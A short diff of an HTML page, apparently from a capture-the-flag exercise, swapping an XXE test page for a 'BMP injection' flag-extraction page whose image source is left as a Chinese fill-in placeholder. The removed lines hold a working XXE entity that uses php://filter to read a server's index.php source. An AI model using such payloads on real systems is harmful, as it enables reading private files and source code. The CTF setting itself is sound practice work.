@@ -1,15 +1,14 @@
-<!DOCTYPE html [
-  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php">
-]>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XXE Payload</title>
+    <title>The Final Exploit</title>
 </head>
 <body>
-    <h1>Testing XXE Vulnerability</h1>
-    <p>If the normalizer is vulnerable, the source code will appear below:</p>
-    <hr>
-    <p style="word-wrap: break-word;">&xxe;</p>
+    <h1>Extracting Flag via BMP Injection</h1>
+    <p>If successful, the flag will appear as a noisy image below:</p>
+    
+    <img src="【這裡請填寫你用工具算出來的魔法字串】">
+    
 </body>
 </html>
